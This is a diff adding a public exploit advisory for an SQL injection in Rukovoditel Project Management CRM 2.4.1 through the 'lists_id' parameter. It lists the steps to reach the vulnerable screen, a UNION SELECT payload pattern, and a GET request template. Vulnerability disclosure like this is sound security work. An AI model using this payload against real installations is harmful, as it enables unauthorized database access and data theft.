@@ -1,0 +1,41 @@
+#################################################################
+
+# Exploit Title: Rukovoditel Project Management CRM 2.4.1 - 'lists_id' SQL
+Injection
+# Dork: N/A
+# Date: 27-01-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.rukovoditel.net/
+# Software Link: https://sourceforge.net/projects/rukovoditel/
+# Version: 2.4.1
+# Category: Webapps
+# Tested on: Wampp @Win
+# CVE: N/A
+# Software Description : Rukovoditel is a free web-based open-source
+project management
+application. A far cry from traditional applications, Rukovoditel gives
+users a broader and extensive approach to project management. Its
+customization options allow users to create additional entities, modify
+and specify the relationship between them, and generate the necessary
+reports.
+
+#################################################################
+
+# Vulnerabilities
+# For the SQL injection to be applied, the user must log in.
+then from the Application structure screen to the global list tab.
+add new value button to create a new list. You can apply sql injection
+through the generated list.
+The pictures of the weaknesses are below.
+https://i.hizliresim.com/nQJZm5.jpg
+https://i.hizliresim.com/WqGmEQ.jpg
+
+#################################################################
+
+# POC - SQLi
+# Parameters : lists_id=1 (string)
+# Attack Pattern : -1'+UnIOn+SeLEcT+1,2--+
+# GET Request :
+http://localhost/[PATH]/index.php?module=global_lists/choices&lists_id=1'[SQL]
+
+#################################################################
